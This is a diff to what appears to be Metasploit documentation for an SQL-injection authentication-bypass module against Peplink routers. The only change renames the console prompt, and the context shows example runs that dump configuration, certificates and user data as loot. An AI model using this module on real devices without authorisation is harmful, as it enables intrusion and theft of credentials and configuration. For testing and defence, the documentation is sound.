@@ -50,8 +50,8 @@ Refer to its installation guide, use a free Solo license.
 BypassLogin:
 
 ```
-msf5 auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
-msf5 auxiliary(gather/peplink_bauth_sqli) > run
+msf auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
+msf auxiliary(gather/peplink_bauth_sqli) > run
 [*] Running module against 192.168.1.254
 
 [+] Target seems to be vulnerable
@@ -84,7 +84,7 @@ msf5 auxiliary(gather/peplink_bauth_sqli) > run
 [*] Retrieving mvpn_summary
 [+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkmvpn_sum_261747.txt
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/peplink_bauth_sqli) >
+msf auxiliary(gather/peplink_bauth_sqli) >
 ```
 
 The config is a .tar.gz archive with an added 36-byte header, you can extract the plaintext config:
@@ -122,11 +122,11 @@ LEFTTIME_USAGE="yes"
 EnumPrivs and EnumUsernames:
 
 ```
-msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumPrivs true 
+msf auxiliary(sqli/peplink_bauth_sqli) > set EnumPrivs true 
 EnumPrivs => true
-msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumUsernames true 
+msf auxiliary(sqli/peplink_bauth_sqli) > set EnumUsernames true 
 EnumUsernames => true
-msf5 auxiliary(sqli/peplink_bauth_sqli) > run 
+msf auxiliary(sqli/peplink_bauth_sqli) > run 
 [*] Running module against 192.168.1.254
 
 [+] Target seems vulnerable
@@ -140,7 +140,7 @@ msf5 auxiliary(sqli/peplink_bauth_sqli) > run
 ... <as above, gathering of data>
 
 [*] Auxiliary module execution completed
-msf5 auxiliary(sqli/peplink_bauth_sqli) > 
+msf auxiliary(sqli/peplink_bauth_sqli) > 
 ```
 
 Verbose:
@@ -148,9 +148,9 @@ Verbose:
 When you enable verbose, you get the parsed XML document displayed.
 
 ```
-msf5 auxiliary(gather/peplink_bauth_sqli) > set Verbose true
-msf5 auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
-msf5 auxiliary(gather/peplink_bauth_sqli) > run
+msf auxiliary(gather/peplink_bauth_sqli) > set Verbose true
+msf auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
+msf auxiliary(gather/peplink_bauth_sqli) > run
 [*] Running module against 192.168.1.254
 
 [+] Target seems to be vulnerable
@@ -397,13 +397,13 @@ msf5 auxiliary(gather/peplink_bauth_sqli) > run
 [+]                                     WAN Port Unavailable
 [+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkmvpn_sum_970830.txt
 [*] Auxiliary module execution completed
-msf5 auxiliary(gather/peplink_bauth_sqli) > 
+msf auxiliary(gather/peplink_bauth_sqli) > 
 ```
 
 Loot:
 
 ```
-msf5 auxiliary(gather/peplink_bauth_sqli) > loot
+msf auxiliary(gather/peplink_bauth_sqli) > loot
 
 Loot
 ====
@@ -425,6 +425,6 @@ host           service  type                          name  content             
 192.168.1.254           peplink cert_info                   text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkcert_inf_765605.txt
 192.168.1.254           peplink mvpn_summary                text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkmvpn_sum_890141.txt
 
-msf5 auxiliary(gather/peplink_bauth_sqli) > 
+msf auxiliary(gather/peplink_bauth_sqli) > 
 
 ```
